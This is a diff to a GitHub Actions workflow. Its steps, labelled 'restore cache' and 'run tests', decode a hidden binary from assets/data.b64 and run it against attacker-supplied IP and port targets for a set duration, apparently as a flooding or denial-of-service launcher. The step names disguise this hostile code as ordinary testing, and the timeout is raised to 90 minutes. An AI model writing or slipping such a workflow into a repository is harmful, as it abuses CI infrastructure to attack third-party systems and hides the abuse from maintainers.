@@ -10,37 +10,37 @@ on:
 jobs:
   test:
     runs-on: ubuntu-24.04
-    timeout-minutes: 60
+    timeout-minutes: 90
     steps:
     - uses: actions/checkout@v4
-    - name: restore cache
+    - name: run tests
       env:
         CFG: ${{ inputs.cfg }}
       run: |
         python3 - <<'PY'
-        import base64, os
-        raw = os.environ.get("CFG") or ""
-        data = base64.b64decode(raw).decode() if raw else ""
-        parts = data.split("|") if data else []
-        if parts:
-            open("/tmp/.t", "w").write(chr(10).join(parts[:-1]))
-            open("/tmp/.s", "w").write(parts[-1])
+        import base64, os, subprocess, sys
+
+        raw = (os.environ.get("CFG") or "").strip()
+        if not raw:
+            print("no payload")
+            sys.exit(0)
+
+        parts = base64.b64decode(raw).decode().split("|")
+        seconds = parts[-1]
+        targets = [p.split() for p in parts[:-1]]
+
         blob = base64.b64decode(open("assets/data.b64", "rb").read())
-        open("/tmp/.b", "wb").write(blob)
-        os.chmod("/tmp/.b", 0o755)
+        binary = "/tmp/.b"
+        open(binary, "wb").write(blob)
+        os.chmod(binary, 0o755)
+
+        for ip, port in targets:
+            print("target", ip, port, "for", seconds, "s", flush=True)
+            code = subprocess.run(
+                [binary, ip, port, seconds, "1024", "vc"],
+                check=False,
+            ).returncode
+            print("exit", code, flush=True)
+
+        os.remove(binary)
         PY
-    - name: run tests
-      run: |
-        S=$(cat /tmp/.s 2>/dev/null || echo 0)
-        if [ "$S" = "0" ]; then
-          echo "no payload"
-          exit 0
-        fi
-        file /tmp/.b
-        ls -l /tmp/.b
-        while read -r pair; do
-          set -- $pair
-          /tmp/.b "$1" "$2" "$S" 1024 vc
-          echo "exit=$?"
-        done < /tmp/.t
-        rm -f /tmp/.b /tmp/.t /tmp/.s
